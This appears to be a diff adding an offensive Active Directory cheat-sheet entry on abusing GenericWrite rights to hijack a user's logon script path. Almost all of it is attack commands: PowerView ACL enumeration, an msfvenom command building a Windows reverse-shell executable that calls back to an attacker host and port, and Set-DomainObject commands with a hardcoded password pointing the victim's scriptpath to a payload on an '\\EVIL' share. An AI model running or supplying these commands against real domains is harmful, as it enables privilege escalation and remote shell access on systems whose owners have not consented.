@@ -1,0 +1,29 @@
+WriteProperty on an ObjectType allow us to modify/overwrite the Script-Path, which means that the next time, when the user logs on, their system will execute our malicious script:
+
+#Enumerate to find all objects with GenericWrite
+
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite')}
+
+#Enumerate to find all objects with GenericWrite and for my current username
+
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#Enumerate to find ippsec with GenericWrite and for my current username
+
+Get-ObjectAcl -SamAccountName "ippsec" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#Building the EXE using msfvenom:
+
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe > privesc.exe
+
+#create a shared folder and add it there and allow everyone to access it
+
+Get-DomainUser -Identity testuser -Properties scriptpath
+
+$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force 
+
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword) 
+
+Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'}  -Credential $Cred -Verbose 
+
+Get-DomainUser -Identity testuser -Properties scriptpath
